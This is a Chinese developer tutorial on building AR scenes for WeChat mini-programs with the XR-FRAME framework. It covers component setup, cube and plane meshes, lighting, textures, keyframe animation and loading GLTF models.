<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9027f13aa82c413ab7aaae9e456f839e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=O6%2BOzqLYfkjR1Mr6feyL8PKWqK4%3D" alt="ar" loading="lazy"/></p>
<h3 data-id="heading-3">AR在线制作平台</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kivicube.com" target="_blank" title="https://www.kivicube.com" ref="nofollow noopener noreferrer">KIVICUBE</a> 提供了可视化的3D场景搭建和动画编排系统：零基础也可创造和发布酷炫的AR作品。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc50ebf0604b48348088f52bf257e728~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=BagamvW8Hw%2BT4UctjyUPqGndMeM%3D" alt="KIVICUBE" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c2970f05e04aa5b3fcc2969c80fbd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=lYCXwi4PLwi7DswIpfN5pKyHoA0%3D" alt="KIVICUBE" loading="lazy"/></p>
<p>官方同时提供了大量<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.kivicube.com%2Ftemplates" target="_blank" title="https://cloud.kivicube.com/templates" ref="nofollow noopener noreferrer">创意模版</a>供大家一键使用</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/133acaba65c248858d6a9a2b4c09ebbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=4XL4XSLcE11nst0fp%2Fj%2F22GrElo%3D" alt="KIVICUBE" loading="lazy"/></p>
<h2 data-id="heading-4">技术方案</h2>
<p>在微信小程序的技术体系下，官方提供了两种解决方案：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2Fopen-ability%2Fvisionkit%2Fbase.html" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/visionkit/base.html" ref="nofollow noopener noreferrer">VisionKit</a></li>
</ul>
<blockquote>
<p>小程序也在基础库 2.20.0 版本开始提供了开发 AR 功能的能力，即 VisionKit。VisionKit 包含了 AR 在内的视觉算法</p>
</blockquote>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2Fxr-frame%2F" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/xr-frame/" ref="nofollow noopener noreferrer">XR-FRAME</a></li>
</ul>
<blockquote>
<p>xr-frame是一套小程序官方提供的XR/3D应用解决方案，基于混合方案实现，性能逼近原生、效果好、易用、强扩展、渐进式、遵循小程序开发标准</p>
</blockquote>
<p>简单来说：</p>
<ul>
<li>VisionKit 是底层视觉引擎，提供能力但需要自己拼装。</li>
<li>XR-FRAME 是完整开发框架，整合了渲染、交互与视觉能力，适合快速实现产品化的 AR 效果。</li>
</ul>
<p>虽然理论上我们完全可以基于 VisionKit 并结合 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwechat-miniprogram%2Fthreejs-miniprogram" target="_blank" title="https://github.com/wechat-miniprogram/threejs-miniprogram" ref="nofollow noopener noreferrer">Three.js</a> 或自研的 WebGL 渲染逻辑来实现 AR 效果，但这种方案开发成本较高：</p>
<p>开发者需要自行处理相机帧与渲染管线的衔接、追踪状态管理、姿态矩阵更新等底层逻辑，整体工程量大且维护复杂。（<strong>Kivicube</strong> 正是使用此方案，确保自研的 AR 可视化搭建平台的产物能兼容各大平台：微信小程序、原生网页H5）</p>
<p>而 XR-FRAME 在此基础上进一步封装了完整的 3D 渲染与交互体系，提供了大量开箱即用的能力，让开发者可以像写前端组件一样，以声明式方式快速构建 AR 场景，而不必深入到底层渲染细节。</p>
<p>因此最后决定：先用 <strong>XR-FRAME</strong> 快速交付第一版 MVP 小程序</p>
<h2 data-id="heading-5">XR-FRAME 指南</h2>
<p>由于是小程序开发，所以学习 <strong>XR-FRAME</strong> 的前提，需要有<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2FMINA.html" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/MINA.html" ref="nofollow noopener noreferrer">小程序基础知识</a></p>
<p>而官方的两个在线文档，内容还是略显单薄，强烈建议直接参考官方 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdtysky%2Fxr-frame-demo" target="_blank" title="https://github.com/dtysky/xr-frame-demo" ref="nofollow noopener noreferrer">《xr-frame系统的示例集》</a></strong> 的<strong>源码</strong>进行实战学习</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2Fxr-frame%2F%23%25E6%2596%25B0%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AAXR%25E7%25BB%2584%25E4%25BB%25B6" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/xr-frame/#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAXR%E7%BB%84%E4%BB%B6" ref="nofollow noopener noreferrer">指南 XR-FRAME</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fcomponent%2Fxr-frame%2Foverview%2F%23%25E6%25A6%2582%25E8%25BF%25B0" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/component/xr-frame/overview/#%E6%A6%82%E8%BF%B0" ref="nofollow noopener noreferrer">组件 XR-FRAME</a></li>
</ul>
<p>本教程配套代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial" ref="nofollow noopener noreferrer">xr-frame-tutorial</a></p>
<h3 data-id="heading-6">XR 组件 模版代码</h3>
<h4 data-id="heading-7">创建 XR 组件</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35fbb864fc3341518aef97d716d06f1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=UlgITFwRtXaph%2B%2FXijysP0zjhJw%3D" alt="1.png" loading="lazy"/></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"component"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"usingComponents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"renderer"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"xr-frame"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<h4 data-id="heading-8">使用 XR 组件</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95863fc915b8455bb4ecda0310b50ce0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=%2FlkJTSiogCRNwwZ4a7OVDYlH51U%3D" alt="2.png" loading="lazy"/></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"usingComponents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"demo1"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"../../components/demo1"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"disableScroll"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> 
  <span class="hljs-attr">"renderer"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"webview"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">demo1</span>
    <span class="hljs-attr">disable-scroll</span>
    <span class="hljs-attr">id</span>=<span class="hljs-string">"main-frame"</span>
    <span class="hljs-attr">width</span>=<span class="hljs-string">"{{renderWidth}}"</span>
    <span class="hljs-attr">height</span>=<span class="hljs-string">"{{renderHeight}}"</span>
    <span class="hljs-attr">style</span>=<span class="hljs-string">"width:{{width}}px;height:{{height}}px;top:{{top}}px;left:{{left}}px;"</span>
  /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Page</span>({
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">left</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">renderWidth</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">renderHeight</span>: <span class="hljs-number">0</span>,
  },
  <span class="hljs-title function_">onLoad</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-keyword">const</span> info = wx.<span class="hljs-title function_">getSystemInfoSync</span>()
    <span class="hljs-keyword">const</span> width = info.<span class="hljs-property">windowWidth</span>
    <span class="hljs-keyword">const</span> height = info.<span class="hljs-property">windowHeight</span>
    <span class="hljs-keyword">const</span> dpi = info.<span class="hljs-property">pixelRatio</span>

    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({
      width, 
      height,
      <span class="hljs-attr">renderWidth</span>: width * dpi,
      <span class="hljs-attr">renderHeight</span>: height * dpi
    });
  },
})
</code></pre>
<h4 data-id="heading-9">渲染 XR 组件</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bd32ef65dfe490ba0128f2b27d69dc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=MwzJs4chxCu6xxWsV6%2BHE58sqr8%3D" alt="3.png" loading="lazy"/></p>
<p>渲染效果：绿色背景的画布 Canvas</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a380758aa7c4b74b8ef86b10ed246d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=s0ZqnpiT2pzi5U9rLZZONgYTacg%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-10">3D 渲染</h3>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo1%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo1/index.wxml" ref="nofollow noopener noreferrer">3D 渲染</a></p>
<p>最基础的 3D 渲染 思维导图</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e2d319896ae4fc0809fbe4227bf773f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=9ghjQXxOfN0f9WGKa6RshEM3Se4%3D" alt="whiteboard_exported_image.png" loading="lazy"/></p>
<h4 data-id="heading-11">添加物体</h4>
<p>添加一个 立方体 （Cube）物体</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"cube"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- 设置 target 指向 cube，让相机始终看向这个立方体--&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"1 3 4"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<p>物体黑色是因为在我们没有给<code>xr-mesh</code>指定材质时，用的是基于PBR效果的默认材质，需要光照</p>
<p>临时解决方案：
创建一个不需要光照的材质，并且使用这个材质</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"simple"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"simple"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorFactor:0.8 0.4 0.4 1"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"simple"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"1 3 4"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a20389031d646edaa91f28d72001df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=H3Rja2laYNmANxDwLSPGwmUeA5M%3D" alt="5.png" loading="lazy"/></p>
<h4 data-id="heading-12">添加光照</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorFactor:0.8 0.4 0.4 1"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- 一个环境光 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ambient"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"1"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- 一个主平行光 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"directional"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"40 70 0"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"3"</span> <span class="hljs-attr">cast-shadow</span> /&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"1 3 4"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3291ad38a47049c7957662c796cd162a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=O9qDhwsV3%2FW1GrRuRiBiikKOf7Y%3D" alt="6.png" loading="lazy"/></p>
<h4 data-id="heading-13">添加纹理</h4>
<p>纹理 Texture 是 GPU 中的图像，供着色器采样使用。在框架中其一般被作为材质的一部分uniforms使用</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:progress</span>=<span class="hljs-string">"handleAssetsProgress"</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 加载纹理 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"waifu"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://mmbizwxaminiprogram-1258344707.cos.ap-guangzhou.myqcloud.com/xr-frame/demo/waifu.png"</span> /&gt;</span>
    <span class="hljs-comment">&lt;!-- 材质中使用纹理 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorMap: waifu"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>

  <span class="hljs-comment">&lt;!-- 使用材质 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">cast-shadow</span> /&gt;</span>
  
  <span class="hljs-comment">&lt;!-- 一个环境光 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ambient"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"1"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- 一个主平行光 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"directional"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"40 70 0"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"3"</span> <span class="hljs-attr">cast-shadow</span> /&gt;</span> 
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"1 3 4"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"cube"</span> <span class="hljs-attr">camera-orbit-control</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45248391b13145f1aa4b81691e7ac573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=3yCMYRoKcxFdYT2FAQIptXtcaMw%3D" alt="7.png" loading="lazy"/></p>
<p>我们继续新加一个 平面 (Plane) 物体</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:progress</span>=<span class="hljs-string">"handleAssetsProgress"</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"deepred"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://avatars.githubusercontent.com/u/13102815"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat2"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorMap: deepred"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat2"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 1 0"</span> /&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a860d8ca71a44ff6abb0bba6aa248dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=IPgAhy0G8Tc5aimpw7iWOkVxmmg%3D" alt="screenshot-20251111-001750.png" loading="lazy"/></p>
<h4 data-id="heading-14">添加动画</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"setting"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"ignoreDevUnusedFiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"ignoreUploadUnusedFiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/281b22d3dd7f47458e6580664ab864b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=wP%2BH7qHv2cKqrJ%2FqEASmVgHgkUo%3D" alt="8.png" loading="lazy"/></p>
<p>添加一个无限旋转的动画</p>
<ul>
<li>keyframe 中定义了帧动画具体的行为，本质上类似于 CSS 中的 keyframes</li>
<li>animation 中定义了帧动画的播放配置，本质上类似于 CSS 中的 animation</li>
</ul>
<p><strong>注意：旋转的值是弧度！！！</strong></p>
<p><strong>360度等于2π弧度，约等于 2 * 3.14</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"keyframe"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"logo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"0"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"rotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"100"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
         <span class="hljs-comment">// 注意是弧度，360度等于2π，约等于6.28</span>
        <span class="hljs-attr">"rotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">6.28</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"animation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"logo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"keyframe"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"logo"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"duration"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"ease"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"linear"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"loop"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 加载动画资源 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"anim"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"keyframe"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/assets/animation.json"</span>/&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat2"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 1 0"</span> <span class="hljs-attr">anim-keyframe</span>=<span class="hljs-string">"anim"</span> <span class="hljs-attr">anim-autoplay</span>=<span class="hljs-string">"clip:logo"</span> /&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63cc9cc761a34b4e89b759f6896ddbf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=VY0Lagd6RCSBfqgsIC3LEtddcGw%3D" alt="kapture.gif" loading="lazy"/></p>
<h4 data-id="heading-15">添加 3D 模型</h4>
<p>支持 GLTF 格式模型</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 加载 GLTF 模型 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"gltf"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"miku"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://mmbizwxaminiprogram-1258344707.cos.ap-guangzhou.myqcloud.com/xr-frame/demo/miku.glb"</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- 渲染 GLTF 组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xr-gltf</span> <span class="hljs-attr">model</span>=<span class="hljs-string">"miku"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"-0.15 0.75 1"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.07 0.07 0.07"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"0 180 0"</span> <span class="hljs-attr">anim-autoplay</span> /&gt;</span>
</code></pre>
